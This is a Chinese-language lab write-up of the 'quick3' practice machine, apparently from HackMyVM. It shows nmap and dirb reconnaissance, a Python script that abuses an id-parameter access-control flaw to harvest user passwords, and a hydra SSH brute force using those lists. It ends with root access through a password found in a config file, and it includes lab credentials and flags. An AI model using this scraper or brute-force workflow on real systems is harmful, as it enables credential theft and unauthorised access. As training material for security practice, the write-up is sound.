kali和quick3都设置NAT模式

|   |   |   |
|---|---|---|
|quick3|easy|漏洞挖掘、越权测试、python爬虫、脚本编写、hydra 爆破、凭据收集|
# 主机发现
```C
netdiscover -i eth0 -r 192.168.44.193/24
```
# 服务探测
```C
nmap -sV -A -T4 -p- 192.168.44.133
```
得到只开放了80和22端口

访问80web
dirb目录扫描
找到后台`http://192.168.44.133/customer/

# 水平越权
任意用户注册账号，登录
查看用户信息，url有?id，尝试修改id，发现水平越权漏洞，查看其他用户密码

# 写爬虫爬取所有用户密码
```python
import os 
import re
from datetime import datetime
import requests
import urllib3
from colorama import init
init(autoreset = True)

def write1(user_match):
	curr_dir = os.getcwd()
	vuln_file = '/user_' + datetime.now().date().strftime('%Y%m%d')+'.txt'
	f = open(curr_dir + vuln_file,'a+',encoding='utf-8')
	f.write(f"{user_match}"+"\n")
	f.close()
	
def write2(pass_match):
	curr_dir = os.getcwd()
	vuln_file = '/pass_' + datetime.now().date().strftime('%Y%m%d')+'.txt'
	f = open(curr_dir + vuln_file,'a+',encoding='utf-8')
	f.write(f"{pass_match}"+"\n")
	f.close()	

def poc_url(id):
	urllib3.disable_warnings()
	url1 = f"http://192.168.44.133/customer/user.php?id={id}"
	proxy = {
		'http':'http://127.0.0.1:8080',
		'https':'http://127.0.0.1:8080'
	}
	headers = {
		"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
		"Cookie":"PHPSESSID=dv5jvd9q7d5e6tk0itdfj5f96d"
	}
	res = requests.get(url1,headers=headers,proxies=None,verify=False,timeout=5)
	if res.status_code == 200:
		user_match = re.search(r'<input type="text" id="name" name="name" value="([^"]+)" required>',res.text).group(1).lower().split()[0]
		pass_match = re.search(r'<input type="password" id="oldpassword" name="oldpassword" value="([^"]+)" required>',res.text).group(1)
		
	write1(user_match)
	write2(pass_match)

if __name__ == '__main__':
	for i in range(1,30):
		poc_url(i)




# python写程序遇到了这个问题,vim打开时最后一个字符都是^M，导致输出的文本不可读出内容，只能用文本编辑器打开。file多了个with CR line terminators，转换成unix也不能解决，最后把换行符号换成"\n"才解决！

```

# 爆破SSH
```C
hydra -L user_20240416.txt -P pass_20240416.txt -t 16 ssh://192.168.44.133 

[22][ssh] host: 10.0.2.15   login: mike   password: 6G3UCx6aH6UYvJ6m
```
# 拿Flag
```C
cat user.txt
HMV{717f274ee66f8541a3031f175f615e72}
```

# 提权
```C
ls /var/www/html
cat /var/www/html/customer/config.php
'root', 'fastandquicktobefaster'
su root

HMV{f178761104e933f9341f13f64b38538a}
```